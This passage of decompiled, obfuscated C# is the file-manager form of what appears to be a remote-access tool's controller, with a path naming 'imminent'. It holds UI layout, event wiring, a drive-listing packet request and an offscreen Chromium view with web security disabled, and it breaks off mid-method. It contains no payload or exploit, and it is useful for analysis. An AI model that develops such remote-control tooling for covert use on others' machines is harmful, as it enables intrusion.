    this.vmethod_122().TabIndex = 1;
    this.vmethod_4().BackColor = Color.FromArgb(241, 244, 245);
    this.vmethod_4().Controls.Add((Control) this.vmethod_54());
    TabPage tabPage10 = this.vmethod_4();
    point1 = new Point(0, 0);
    Point point17 = point1;
    tabPage10.Location = point17;
    this.vmethod_4().Name = "TabPageDownloads";
    TabPage tabPage11 = this.vmethod_4();
    padding1 = new Padding(3);
    Padding padding5 = padding1;
    tabPage11.Padding = padding5;
    TabPage tabPage12 = this.vmethod_4();
    size1 = new Size(713, 559);
    Size size51 = size1;
    tabPage12.Size = size51;
    this.vmethod_4().TabIndex = 1;
    this.vmethod_4().Tag = (object) "normal";
    this.vmethod_4().Text = "Downloads";
    this.vmethod_54().Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
    this.vmethod_54().Columns.AddRange(new ColumnHeader[5]
    {
      this.vmethod_56(),
      this.vmethod_58(),
      this.vmethod_60(),
      this.vmethod_62(),
      this.vmethod_64()
    });
    this.vmethod_54().ContextMenuStrip = this.vmethod_72();
    this.vmethod_54().Font = new Font("Segoe UI", 8.25f);
    this.vmethod_54().FullRowSelect = true;
    this.vmethod_54().HideSelection = false;
    GClass41 gclass41_5 = this.vmethod_54();
    point1 = new Point(3, 3);
    Point point18 = point1;
    gclass41_5.Location = point18;
    this.vmethod_54().Name = "ListviewTransfers";
    GClass41 gclass41_6 = this.vmethod_54();
    size1 = new Size(704, 550);
    Size size52 = size1;
    gclass41_6.Size = size52;
    this.vmethod_54().SmallImageList = this.vmethod_66();
    this.vmethod_54().TabIndex = 1;
    this.vmethod_54().UseCompatibleStateImageBehavior = false;
    this.vmethod_54().View = View.Details;
    this.vmethod_56().Text = "Name";
    this.vmethod_56().Width = 170;
    this.vmethod_58().Text = "File Size";
    this.vmethod_58().TextAlign = HorizontalAlignment.Right;
    this.vmethod_58().Width = 75;
    this.vmethod_60().Text = "Progress";
    this.vmethod_60().TextAlign = HorizontalAlignment.Center;
    this.vmethod_60().Width = 132;
    this.vmethod_62().Text = "Rate";
    this.vmethod_62().TextAlign = HorizontalAlignment.Right;
    this.vmethod_62().Width = 77;
    this.vmethod_64().Text = "Time Left";
    this.vmethod_64().Width = 122;
    this.vmethod_126().BackColor = Color.Transparent;
    this.vmethod_126().method_3((Control0.Enum9) 0);
    Control0 control0_1 = this.vmethod_126();
    point1 = new Point(415, 319);
    Point point19 = point1;
    control0_1.Location = point19;
    this.vmethod_126().Name = "Preloader1";
    this.vmethod_126().method_1(5);
    Control0 control0_2 = this.vmethod_126();
    size1 = new Size(171, 10);
    Size size53 = size1;
    control0_2.Size = size53;
    this.vmethod_126().TabIndex = 3;
    this.vmethod_126().Text = "Preloader1";
    this.AutoScaleDimensions = new SizeF(6f, 13f);
    this.AutoScaleMode = AutoScaleMode.Font;
    this.BackColor = Color.FromArgb(241, 244, 245);
    size1 = new Size(1000, 649);
    this.ClientSize = size1;
    this.Controls.Add((Control) this.vmethod_126());
    this.Controls.Add((Control) this.vmethod_0());
    this.Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
    this.Name = nameof (FormFileManager);
    this.StartPosition = FormStartPosition.CenterScreen;
    this.Text = "X/X";
    this.vmethod_6().ResumeLayout(false);
    this.vmethod_70().ResumeLayout(false);
    this.vmethod_72().ResumeLayout(false);
    this.vmethod_0().ResumeLayout(false);
    this.vmethod_2().ResumeLayout(false);
    this.vmethod_2().PerformLayout();
    this.vmethod_88().ResumeLayout(false);
    this.vmethod_90().ResumeLayout(false);
    this.vmethod_90().PerformLayout();
    this.vmethod_102().ResumeLayout(false);
    this.vmethod_102().PerformLayout();
    this.vmethod_4().ResumeLayout(false);
    this.ResumeLayout(false);
  }

  internal virtual GControl6 vmethod_0() => this.gcontrol6_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_1(GControl6 gcontrol6_2) => this.gcontrol6_0 = gcontrol6_2;

  internal virtual TabPage vmethod_2() => this.tabPage_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_3(TabPage tabPage_4) => this.tabPage_0 = tabPage_4;

  internal virtual TabPage vmethod_4() => this.tabPage_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_5(TabPage tabPage_4) => this.tabPage_1 = tabPage_4;

  internal virtual ContextMenuStrip vmethod_6() => this.contextMenuStrip_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_7(ContextMenuStrip contextMenuStrip_3) => this.contextMenuStrip_0 = contextMenuStrip_3;

  internal virtual ToolStripMenuItem vmethod_8() => this.toolStripMenuItem_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_9(ToolStripMenuItem toolStripMenuItem_27) => this.toolStripMenuItem_0 = toolStripMenuItem_27;

  internal virtual ToolStripMenuItem vmethod_10() => this.toolStripMenuItem_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_11(ToolStripMenuItem toolStripMenuItem_27)
  {
    EventHandler eventHandler = new EventHandler(this.method_4);
    if (this.toolStripMenuItem_1 != null)
      this.toolStripMenuItem_1.Click -= eventHandler;
    this.toolStripMenuItem_1 = toolStripMenuItem_27;
    if (this.toolStripMenuItem_1 == null)
      return;
    this.toolStripMenuItem_1.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_12() => this.toolStripMenuItem_2;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_13(ToolStripMenuItem toolStripMenuItem_27)
  {
    EventHandler eventHandler = new EventHandler(this.method_5);
    if (this.toolStripMenuItem_2 != null)
      this.toolStripMenuItem_2.Click -= eventHandler;
    this.toolStripMenuItem_2 = toolStripMenuItem_27;
    if (this.toolStripMenuItem_2 == null)
      return;
    this.toolStripMenuItem_2.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_14() => this.toolStripMenuItem_3;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_15(ToolStripMenuItem toolStripMenuItem_27)
  {
    EventHandler eventHandler = new EventHandler(this.method_6);
    if (this.toolStripMenuItem_3 != null)
      this.toolStripMenuItem_3.Click -= eventHandler;
    this.toolStripMenuItem_3 = toolStripMenuItem_27;
    if (this.toolStripMenuItem_3 == null)
      return;
    this.toolStripMenuItem_3.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_16() => this.toolStripMenuItem_4;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_17(ToolStripMenuItem toolStripMenuItem_27)
  {
    EventHandler eventHandler = new EventHandler(this.method_7);
    if (this.toolStripMenuItem_4 != null)
      this.toolStripMenuItem_4.Click -= eventHandler;
    this.toolStripMenuItem_4 = toolStripMenuItem_27;
    if (this.toolStripMenuItem_4 == null)
      return;
    this.toolStripMenuItem_4.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_18() => this.toolStripMenuItem_5;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_19(ToolStripMenuItem toolStripMenuItem_27)
  {
    EventHandler eventHandler = new EventHandler(this.method_8);
    if (this.toolStripMenuItem_5 != null)
      this.toolStripMenuItem_5.Click -= eventHandler;
    this.toolStripMenuItem_5 = toolStripMenuItem_27;
    if (this.toolStripMenuItem_5 == null)
      return;
    this.toolStripMenuItem_5.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_20() => this.toolStripMenuItem_6;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_21(ToolStripMenuItem toolStripMenuItem_27)
  {
    EventHandler eventHandler = new EventHandler(this.method_9);
    if (this.toolStripMenuItem_6 != null)
      this.toolStripMenuItem_6.Click -= eventHandler;
    this.toolStripMenuItem_6 = toolStripMenuItem_27;
    if (this.toolStripMenuItem_6 == null)
      return;
    this.toolStripMenuItem_6.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_22() => this.toolStripMenuItem_7;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_23(ToolStripMenuItem toolStripMenuItem_27)
  {
    EventHandler eventHandler = new EventHandler(this.method_10);
    if (this.toolStripMenuItem_7 != null)
      this.toolStripMenuItem_7.Click -= eventHandler;
    this.toolStripMenuItem_7 = toolStripMenuItem_27;
    if (this.toolStripMenuItem_7 == null)
      return;
    this.toolStripMenuItem_7.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_24() => this.toolStripMenuItem_8;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_25(ToolStripMenuItem toolStripMenuItem_27)
  {
    EventHandler eventHandler = new EventHandler(this.method_11);
    if (this.toolStripMenuItem_8 != null)
      this.toolStripMenuItem_8.Click -= eventHandler;
    this.toolStripMenuItem_8 = toolStripMenuItem_27;
    if (this.toolStripMenuItem_8 == null)
      return;
    this.toolStripMenuItem_8.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_26() => this.toolStripMenuItem_9;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_27(ToolStripMenuItem toolStripMenuItem_27)
  {
    EventHandler eventHandler = new EventHandler(this.method_12);
    if (this.toolStripMenuItem_9 != null)
      this.toolStripMenuItem_9.Click -= eventHandler;
    this.toolStripMenuItem_9 = toolStripMenuItem_27;
    if (this.toolStripMenuItem_9 == null)
      return;
    this.toolStripMenuItem_9.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_28() => this.toolStripMenuItem_10;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_29(ToolStripMenuItem toolStripMenuItem_27)
  {
    EventHandler eventHandler = new EventHandler(this.method_13);
    if (this.toolStripMenuItem_10 != null)
      this.toolStripMenuItem_10.Click -= eventHandler;
    this.toolStripMenuItem_10 = toolStripMenuItem_27;
    if (this.toolStripMenuItem_10 == null)
      return;
    this.toolStripMenuItem_10.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_30() => this.toolStripMenuItem_11;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_31(ToolStripMenuItem toolStripMenuItem_27)
  {
    EventHandler eventHandler = new EventHandler(this.method_14);
    if (this.toolStripMenuItem_11 != null)
      this.toolStripMenuItem_11.Click -= eventHandler;
    this.toolStripMenuItem_11 = toolStripMenuItem_27;
    if (this.toolStripMenuItem_11 == null)
      return;
    this.toolStripMenuItem_11.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_32() => this.toolStripMenuItem_12;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_33(ToolStripMenuItem toolStripMenuItem_27)
  {
    EventHandler eventHandler = new EventHandler(this.method_15);
    if (this.toolStripMenuItem_12 != null)
      this.toolStripMenuItem_12.Click -= eventHandler;
    this.toolStripMenuItem_12 = toolStripMenuItem_27;
    if (this.toolStripMenuItem_12 == null)
      return;
    this.toolStripMenuItem_12.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_34() => this.toolStripMenuItem_13;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_35(ToolStripMenuItem toolStripMenuItem_27)
  {
    EventHandler eventHandler = new EventHandler(this.method_16);
    if (this.toolStripMenuItem_13 != null)
      this.toolStripMenuItem_13.Click -= eventHandler;
    this.toolStripMenuItem_13 = toolStripMenuItem_27;
    if (this.toolStripMenuItem_13 == null)
      return;
    this.toolStripMenuItem_13.Click += eventHandler;
  }

  internal virtual ToolStripSeparator vmethod_36() => this.toolStripSeparator_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_37(ToolStripSeparator toolStripSeparator_3) => this.toolStripSeparator_0 = toolStripSeparator_3;

  internal virtual ToolStripMenuItem vmethod_38() => this.toolStripMenuItem_14;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_39(ToolStripMenuItem toolStripMenuItem_27)
  {
    EventHandler eventHandler = new EventHandler(this.method_17);
    if (this.toolStripMenuItem_14 != null)
      this.toolStripMenuItem_14.Click -= eventHandler;
    this.toolStripMenuItem_14 = toolStripMenuItem_27;
    if (this.toolStripMenuItem_14 == null)
      return;
    this.toolStripMenuItem_14.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_40() => this.toolStripMenuItem_15;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_41(ToolStripMenuItem toolStripMenuItem_27)
  {
    EventHandler eventHandler = new EventHandler(this.method_18);
    if (this.toolStripMenuItem_15 != null)
      this.toolStripMenuItem_15.Click -= eventHandler;
    this.toolStripMenuItem_15 = toolStripMenuItem_27;
    if (this.toolStripMenuItem_15 == null)
      return;
    this.toolStripMenuItem_15.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_42() => this.toolStripMenuItem_16;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_43(ToolStripMenuItem toolStripMenuItem_27)
  {
    EventHandler eventHandler = new EventHandler(this.method_19);
    if (this.toolStripMenuItem_16 != null)
      this.toolStripMenuItem_16.Click -= eventHandler;
    this.toolStripMenuItem_16 = toolStripMenuItem_27;
    if (this.toolStripMenuItem_16 == null)
      return;
    this.toolStripMenuItem_16.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_44() => this.toolStripMenuItem_17;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_45(ToolStripMenuItem toolStripMenuItem_27)
  {
    EventHandler eventHandler = new EventHandler(this.method_20);
    if (this.toolStripMenuItem_17 != null)
      this.toolStripMenuItem_17.Click -= eventHandler;
    this.toolStripMenuItem_17 = toolStripMenuItem_27;
    if (this.toolStripMenuItem_17 == null)
      return;
    this.toolStripMenuItem_17.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_46() => this.toolStripMenuItem_18;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_47(ToolStripMenuItem toolStripMenuItem_27)
  {
    EventHandler eventHandler = new EventHandler(this.method_21);
    if (this.toolStripMenuItem_18 != null)
      this.toolStripMenuItem_18.Click -= eventHandler;
    this.toolStripMenuItem_18 = toolStripMenuItem_27;
    if (this.toolStripMenuItem_18 == null)
      return;
    this.toolStripMenuItem_18.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_48() => this.toolStripMenuItem_19;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_49(ToolStripMenuItem toolStripMenuItem_27)
  {
    EventHandler eventHandler = new EventHandler(this.method_22);
    if (this.toolStripMenuItem_19 != null)
      this.toolStripMenuItem_19.Click -= eventHandler;
    this.toolStripMenuItem_19 = toolStripMenuItem_27;
    if (this.toolStripMenuItem_19 == null)
      return;
    this.toolStripMenuItem_19.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_50() => this.toolStripMenuItem_20;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_51(ToolStripMenuItem toolStripMenuItem_27)
  {
    EventHandler eventHandler = new EventHandler(this.method_62);
    if (this.toolStripMenuItem_20 != null)
      this.toolStripMenuItem_20.Click -= eventHandler;
    this.toolStripMenuItem_20 = toolStripMenuItem_27;
    if (this.toolStripMenuItem_20 == null)
      return;
    this.toolStripMenuItem_20.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_52() => this.toolStripMenuItem_21;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_53(ToolStripMenuItem toolStripMenuItem_27)
  {
    EventHandler eventHandler = new EventHandler(this.method_51);
    if (this.toolStripMenuItem_21 != null)
      this.toolStripMenuItem_21.Click -= eventHandler;
    this.toolStripMenuItem_21 = toolStripMenuItem_27;
    if (this.toolStripMenuItem_21 == null)
      return;
    this.toolStripMenuItem_21.Click += eventHandler;
  }

  internal virtual GClass41 vmethod_54() => this.gclass41_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_55(GClass41 gclass41_3) => this.gclass41_0 = gclass41_3;

  internal virtual ColumnHeader vmethod_56() => this.columnHeader_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_57(ColumnHeader columnHeader_11) => this.columnHeader_0 = columnHeader_11;

  internal virtual ColumnHeader vmethod_58() => this.columnHeader_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_59(ColumnHeader columnHeader_11) => this.columnHeader_1 = columnHeader_11;

  internal virtual ColumnHeader vmethod_60() => this.columnHeader_2;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_61(ColumnHeader columnHeader_11) => this.columnHeader_2 = columnHeader_11;

  internal virtual ColumnHeader vmethod_62() => this.columnHeader_3;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_63(ColumnHeader columnHeader_11) => this.columnHeader_3 = columnHeader_11;

  internal virtual ColumnHeader vmethod_64() => this.columnHeader_4;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_65(ColumnHeader columnHeader_11) => this.columnHeader_4 = columnHeader_11;

  internal virtual ImageList vmethod_66() => this.imageList_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_67(ImageList imageList_1) => this.imageList_0 = imageList_1;

  internal virtual Timer vmethod_68() => this.timer_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_69(Timer timer_1)
  {
    EventHandler eventHandler = new EventHandler(this.method_52);
    if (this.timer_0 != null)
      this.timer_0.Tick -= eventHandler;
    this.timer_0 = timer_1;
    if (this.timer_0 == null)
      return;
    this.timer_0.Tick += eventHandler;
  }

  internal virtual ContextMenuStrip vmethod_70() => this.contextMenuStrip_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_71(ContextMenuStrip contextMenuStrip_3) => this.contextMenuStrip_1 = contextMenuStrip_3;

  internal virtual ContextMenuStrip vmethod_72() => this.contextMenuStrip_2;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_73(ContextMenuStrip contextMenuStrip_3) => this.contextMenuStrip_2 = contextMenuStrip_3;

  internal virtual ToolStripMenuItem vmethod_74() => this.toolStripMenuItem_22;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_75(ToolStripMenuItem toolStripMenuItem_27)
  {
    EventHandler eventHandler = new EventHandler(this.method_55);
    if (this.toolStripMenuItem_22 != null)
      this.toolStripMenuItem_22.Click -= eventHandler;
    this.toolStripMenuItem_22 = toolStripMenuItem_27;
    if (this.toolStripMenuItem_22 == null)
      return;
    this.toolStripMenuItem_22.Click += eventHandler;
  }

  internal virtual ToolStripSeparator vmethod_76() => this.toolStripSeparator_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_77(ToolStripSeparator toolStripSeparator_3) => this.toolStripSeparator_1 = toolStripSeparator_3;

  internal virtual ToolStripMenuItem vmethod_78() => this.toolStripMenuItem_23;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_79(ToolStripMenuItem toolStripMenuItem_27)
  {
    EventHandler eventHandler = new EventHandler(this.method_56);
    if (this.toolStripMenuItem_23 != null)
      this.toolStripMenuItem_23.Click -= eventHandler;
    this.toolStripMenuItem_23 = toolStripMenuItem_27;
    if (this.toolStripMenuItem_23 == null)
      return;
    this.toolStripMenuItem_23.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_80() => this.toolStripMenuItem_24;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_81(ToolStripMenuItem toolStripMenuItem_27)
  {
    EventHandler eventHandler = new EventHandler(this.method_57);
    if (this.toolStripMenuItem_24 != null)
      this.toolStripMenuItem_24.Click -= eventHandler;
    this.toolStripMenuItem_24 = toolStripMenuItem_27;
    if (this.toolStripMenuItem_24 == null)
      return;
    this.toolStripMenuItem_24.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_82() => this.toolStripMenuItem_25;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_83(ToolStripMenuItem toolStripMenuItem_27)
  {
    EventHandler eventHandler = new EventHandler(this.method_58);
    if (this.toolStripMenuItem_25 != null)
      this.toolStripMenuItem_25.Click -= eventHandler;
    this.toolStripMenuItem_25 = toolStripMenuItem_27;
    if (this.toolStripMenuItem_25 == null)
      return;
    this.toolStripMenuItem_25.Click += eventHandler;
  }

  internal virtual ToolStripSeparator vmethod_84() => this.toolStripSeparator_2;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_85(ToolStripSeparator toolStripSeparator_3) => this.toolStripSeparator_2 = toolStripSeparator_3;

  internal virtual ToolStripMenuItem vmethod_86() => this.toolStripMenuItem_26;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_87(ToolStripMenuItem toolStripMenuItem_27)
  {
    EventHandler eventHandler = new EventHandler(this.method_59);
    if (this.toolStripMenuItem_26 != null)
      this.toolStripMenuItem_26.Click -= eventHandler;
    this.toolStripMenuItem_26 = toolStripMenuItem_27;
    if (this.toolStripMenuItem_26 == null)
      return;
    this.toolStripMenuItem_26.Click += eventHandler;
  }

  internal virtual GControl6 vmethod_88() => this.gcontrol6_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_89(GControl6 gcontrol6_2) => this.gcontrol6_1 = gcontrol6_2;

  internal virtual TabPage vmethod_90() => this.tabPage_2;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_91(TabPage tabPage_4) => this.tabPage_2 = tabPage_4;

  internal virtual GClass41 vmethod_92() => this.gclass41_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_93(GClass41 gclass41_3)
  {
    EventHandler eventHandler = new EventHandler(this.method_3);
    if (this.gclass41_1 != null)
      this.gclass41_1.DoubleClick -= eventHandler;
    this.gclass41_1 = gclass41_3;
    if (this.gclass41_1 == null)
      return;
    this.gclass41_1.DoubleClick += eventHandler;
  }

  internal virtual ColumnHeader vmethod_94() => this.columnHeader_5;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_95(ColumnHeader columnHeader_11) => this.columnHeader_5 = columnHeader_11;

  internal virtual ColumnHeader vmethod_96() => this.columnHeader_6;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_97(ColumnHeader columnHeader_11) => this.columnHeader_6 = columnHeader_11;

  internal virtual ColumnHeader vmethod_98() => this.columnHeader_7;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_99(ColumnHeader columnHeader_11) => this.columnHeader_7 = columnHeader_11;

  internal virtual ColumnHeader vmethod_100() => this.columnHeader_8;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_101(ColumnHeader columnHeader_11) => this.columnHeader_8 = columnHeader_11;

  internal virtual TabPage vmethod_102() => this.tabPage_3;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_103(TabPage tabPage_4) => this.tabPage_3 = tabPage_4;

  internal virtual Label vmethod_104() => this.label_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_105(Label label_3) => this.label_0 = label_3;

  internal virtual LinkLabel vmethod_106() => this.linkLabel_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_107(LinkLabel linkLabel_2)
  {
    LinkLabelLinkClickedEventHandler clickedEventHandler = new LinkLabelLinkClickedEventHandler(this.method_2);
    if (this.linkLabel_0 != null)
      this.linkLabel_0.LinkClicked -= clickedEventHandler;
    this.linkLabel_0 = linkLabel_2;
    if (this.linkLabel_0 == null)
      return;
    this.linkLabel_0.LinkClicked += clickedEventHandler;
  }

  internal virtual GClass41 vmethod_108() => this.gclass41_2;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_109(GClass41 gclass41_3) => this.gclass41_2 = gclass41_3;

  internal virtual ColumnHeader vmethod_110() => this.columnHeader_9;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_111(ColumnHeader columnHeader_11) => this.columnHeader_9 = columnHeader_11;

  internal virtual ColumnHeader vmethod_112() => this.columnHeader_10;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_113(ColumnHeader columnHeader_11) => this.columnHeader_10 = columnHeader_11;

  internal virtual Label vmethod_114() => this.label_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_115(Label label_3) => this.label_1 = label_3;

  internal virtual GControl8 vmethod_116() => this.gcontrol8_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_117(GControl8 gcontrol8_1)
  {
    EventHandler eventHandler = new EventHandler(this.method_1);
    if (this.gcontrol8_0 != null)
      this.gcontrol8_0.Click -= eventHandler;
    this.gcontrol8_0 = gcontrol8_1;
    if (this.gcontrol8_0 == null)
      return;
    this.gcontrol8_0.Click += eventHandler;
  }

  internal virtual TextBox vmethod_118() => this.textBox_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_119(TextBox textBox_1)
  {
    KeyEventHandler keyEventHandler = new KeyEventHandler(this.method_50);
    if (this.textBox_0 != null)
      this.textBox_0.KeyDown -= keyEventHandler;
    this.textBox_0 = textBox_1;
    if (this.textBox_0 == null)
      return;
    this.textBox_0.KeyDown += keyEventHandler;
  }

  internal virtual Label vmethod_120() => this.label_2;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_121(Label label_3) => this.label_2 = label_3;

  internal virtual ComboBox vmethod_122() => this.comboBox_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_123(ComboBox comboBox_1)
  {
    EventHandler eventHandler = new EventHandler(this.method_54);
    if (this.comboBox_0 != null)
      this.comboBox_0.SelectedIndexChanged -= eventHandler;
    this.comboBox_0 = comboBox_1;
    if (this.comboBox_0 == null)
      return;
    this.comboBox_0.SelectedIndexChanged += eventHandler;
  }

  internal virtual LinkLabel vmethod_124() => this.linkLabel_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_125(LinkLabel linkLabel_2)
  {
    LinkLabelLinkClickedEventHandler clickedEventHandler = new LinkLabelLinkClickedEventHandler(this.method_60);
    if (this.linkLabel_1 != null)
      this.linkLabel_1.LinkClicked -= clickedEventHandler;
    this.linkLabel_1 = linkLabel_2;
    if (this.linkLabel_1 == null)
      return;
    this.linkLabel_1.LinkClicked += clickedEventHandler;
  }

  internal virtual Control0 vmethod_126() => this.control0_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_127(Control0 control0_1) => this.control0_0 = control0_1;

  public virtual ChromiumWebBrowser vmethod_128() => this.chromiumWebBrowser_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public virtual void vmethod_129(ChromiumWebBrowser chromiumWebBrowser_1)
  {
    EventHandler<FrameLoadEndEventArgs> eventHandler = new EventHandler<FrameLoadEndEventArgs>(this.method_61);
    if (this.chromiumWebBrowser_0 != null)
      this.chromiumWebBrowser_0.FrameLoadEnd -= eventHandler;
    this.chromiumWebBrowser_0 = chromiumWebBrowser_1;
    if (this.chromiumWebBrowser_0 == null)
      return;
    this.chromiumWebBrowser_0.FrameLoadEnd += eventHandler;
  }

  private void FormFileManager_Load(object sender, EventArgs e)
  {
    this.MinimumSize = new Size(853, 588);
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.gclass18_0, new object[2]
    {
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.FileHeader,
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.FileHeaderPacket.Drives
    });
    this.method_46();
    this.method_0();
  }

  [MethodImpl(MethodImplOptions.NoOptimization)]
  private void method_0()
  {
    string path = string.Format("{0}\\bin\\cef\\site\\base\\html\\imminent\\filemanager.html", (object) Application.StartupPath);
    if (!File.Exists(path))
    {
      int num = (int) MessageBox.Show("Error The html file doesn't exists : " + path);
      ProjectData.EndApp();
    }
    this.vmethod_129(new ChromiumWebBrowser(path));
    ((Control) this.vmethod_128()).AllowDrop = false;
    ((Control) this.vmethod_128()).Location = new Point(-1920, -1080);
    ((Control) this.vmethod_128()).Size = new Size(1210, 749);
    ((Control) this.vmethod_128()).Dock = DockStyle.None;
    this.Controls.Add((Control) this.vmethod_128());
    this.vmethod_128().BrowserSettings = new BrowserSettings()
    {
      FileAccessFromFileUrls = (CefState) 1,
      UniversalAccessFromFileUrls = (CefState) 1,
      WebSecurity = (CefState) 2
    };
    this.vmethod_128().RegisterJsObject("fileManager", (object) new FileCefHandler(this), (BindingOptions) null);
  }

  private void method_1(object sender, EventArgs e)
  {
    this.vmethod_88().SelectedIndex = 1;
    this.vmethod_108().Items.Clear();
    this.method_36(this.vmethod_122().Text, this.vmethod_118().Text);
  }

  private void method_2(object sender, LinkLabelLinkClickedEventArgs e) => this.vmethod_88().SelectedIndex = 0;

  private void method_3(object sender, EventArgs e)
  {
    try
    {
      foreach (ListViewItem selectedItem in this.vmethod_92().SelectedItems)
      {
        if (selectedItem.ImageIndex == 0)
        {
          if (Operators.ConditionalCompareObjectEqual(selectedItem.Tag, (object) '\u0001', false))
          {
            if (this.vmethod_122().Text.Length == 3)
            {
